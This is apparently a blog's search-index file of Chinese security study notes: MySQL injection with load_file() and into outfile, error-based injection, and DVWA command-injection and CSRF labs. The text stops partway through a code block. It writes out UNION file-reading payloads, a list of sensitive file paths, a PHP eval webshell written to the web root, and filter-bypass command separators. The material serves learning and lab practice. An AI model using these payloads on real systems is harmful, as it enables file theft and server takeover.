<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Mysql注入中load_file()与select into outfile命令</title>
    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
<span id="more"></span>

<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
<p>我们构造**$id**为：</p>
<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
<p>我们的查询语句就变成：</p>
<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
<p>所以上面的语句就变成：</p>
<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
<p>2、能够使用union （需要mysql 3以上的版本）</p>
<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
<p>后天条件需要二个：</p>
<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
<p>而无法查看到代码。</p>
<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
<p>apache文件。</p>
<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
<p>14、/etc/my.cnf Mysql的配置文件</p>
<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
<p><strong>其中，into outfile的使用前提是：</strong></p>
<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
<p>2.要有file权限，默认情况下只有root权限有</p>
<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
<p>1.直接写进文件里</p>
<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
<p>2.修改文件结尾</p>
<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
<p>查版本号</p>
<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
<p>蚁剑连接</p>
<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA靶场（待补充）</title>
    <url>/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Command-Injection-命令执行"><a href="#Command-Injection-命令执行" class="headerlink" title="Command Injection(命令执行)"></a>Command Injection(命令执行)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig　　　　先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig</span><br><span class="line">127.0.0.1 &amp;&amp; ipconfig　　  先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig</span><br><span class="line">127.0.0.1 | ipconfig　　　　不管127.0.0.1执行是否成功都会执行ipconfig</span><br><span class="line">127.0.0 || ipconfig　　　   前面的命令要执行失败，才可以执行后面的命令</span><br><span class="line">执行 ping 127.0.0.1 ; ipconfig Linux下分隔符</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><h3 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">  <span class="comment">// Get input</span></span><br><span class="line">  <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定操作系统并执行ping命令</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">  <span class="comment">// Windows</span></span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// *nix</span></span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>其中ping -c 4 是在linux中的命令</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669688179386-0f30def0-4bf6-4694-ad5f-8c6b3c56e1d6.png" alt="img"></p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>通过代码可以发现，服务器仅仅只是判断了不同的操作系统执行不同的命令，并没有做其他的限制</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669687180625-c555b4d8-fa46-401a-b098-b0452805bff3.png" alt="img"></p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码解析-1"><a href="#源码解析-1" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line"><span class="comment">//设置命令黑名单，里面包含&amp;&amp;和；</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line"><span class="comment">//将参数中有&amp;&amp;和；的都替换成空</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>由于过滤了&amp;&amp;与；</p>
<p>所以我们还能使用&amp;、|、 ||</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&amp;ipconfig</span><br><span class="line">127.0.0.1|ipconfig</span><br><span class="line">127.0.0||ipconfig</span><br></pre></td></tr></table></figure>

<h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><h3 id="源码解析-2"><a href="#源码解析-2" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line"><span class="comment">//设置命令黑名单，里面包含&amp; ；| - $ ( ) \ &#x27; ||</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line"><span class="comment">//替换成空</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h3><p>​      看到代码，发现黑名单中的限制更多了，像 ‘&amp;’，’| ‘，’||’，’;’，’$’ 等许多都加了限制，但是要仔细观察 ，比如说这个 ‘| ‘ ，它是在管道符后面加了个空格，因此考虑使用 127.0.0.1 |ipconfig 来绕过</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码解析-3"><a href="#源码解析-3" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">　　<span class="comment">// stripslashes函数会剥离字符串中的反斜杠，然后返回剥离完反斜杠的字符串</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects，以.作为分隔符，分割$target</span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer，检测分割后的元素是否都是数字类型</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.如过都是数字类型的话，就将2他们再合并成$torget</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h3><p>​        设置黑名单过滤特殊符号<br>​        替换、转义关键字<br>​        设置白名单，限制传参</p>
<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h1><p>CSRF（跨站请求伪造），全称为Cross-site request forgery，简单来说，是攻击者利用受害者尚未失效的身份认证信息，诱骗受害者点击恶意链接或含有攻击代码的页面，在受害者不知情的情况下以受害者的身份向服务器发起请求，从而实现非法攻击（改密）。</p>
<h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><h3 id="源码解析-4"><a href="#源码解析-4" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"><span class="comment">//获取两个输入框的密码</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="comment">//查看两次输入的是否一致</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line"><span class="comment">//如果一致就直接插入数据库</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ 